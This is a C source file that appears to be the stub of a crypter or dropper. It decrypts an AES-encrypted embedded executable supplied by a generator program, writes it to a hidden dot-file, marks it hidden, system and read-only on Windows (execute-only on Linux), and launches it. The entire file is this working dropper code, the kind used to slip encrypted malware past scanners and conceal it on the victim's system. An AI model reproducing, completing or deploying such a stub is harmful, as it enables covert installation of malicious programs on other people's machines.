/* All the data needed for the stub run that cames from the gen program goes here */

#include "general.h"
#include "lib/aes.h"
#include "lib/file.h"

#ifdef WINDOWS
 #define FILE_ATTR FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_READONLY | FILE_ATTRIBUTE_SYSTEM
#endif

// These definitions are just for testing
#ifndef ENC_CONTENT
 #define ENC_CONTENT {0xba, 0xdd, 0x47, 0x5, 0x30, 0x2f, 0x21, 0xb7, 0x7a, 0xba, 0x63, 0xd3, 0x49, 0x29, 0x35, 0xcd}
#endif
#ifndef ENC_SIZE
 #define ENC_SIZE 16
#endif
#ifndef KEY
 #define KEY {48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 65, 66, 67, 68, 69, 70}
#endif
#ifndef PATH
 #define PATH "./.program.exe"
#endif

#ifdef WINDOWS
    #include <Windows.h>

    void run(const char *path) {
        PROCESS_INFORMATION pi;
        STARTUPINFO si;
        memset(&si, 0, sizeof si);
        si.cb = sizeof si;

        bool ret = CreateProcess(path, NULL, NULL, NULL, false, 0, NULL, NULL, &si, &pi);
        if(!ret)
            return;

        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }

    void hideFile(const char *path) {
        SetFileAttributes(path, FILE_ATTR);
    }
#elif defined LINUX
    #include <unistd.h>
    #include <sys/wait.h>
    #include <sys/types.h>

    void run(const char *path) {
        pid_t pid = fork();
        if(pid == 0) {
            execl(path, path, (char *) NULL);
        }
    }

    void hideFile(const char *path) {
        chmod(path, 00111);
    }
#else
    #error NO_OS_ERROR_MSG
#endif


int main(void) {
    if(file_exists(PATH)) {
        run(PATH);
        return 0;
    }

    /* Get the date that came from the main program */
    uint8_t key[] = KEY;
    uint8_t content[] = ENC_CONTENT;
    uint8_t iv[] = IV;
    SIZ size = ENC_SIZE;

    /* Decrypt */
    struct AES_ctx context;
    AES_init_ctx_iv(&context, key, iv);
    AES_CBC_decrypt_buffer(&context, content, size);

    /* Remove pading */
    uint8_t pad = content[size - 1];
    size -= pad;

    /* Write output program */
    UNIV_FILE file = file_open(PATH, M_WRITE_NEW);
    file_write(content, size, file);
    file_close(file);

    hideFile(PATH);
    run(PATH);
    return 0;
}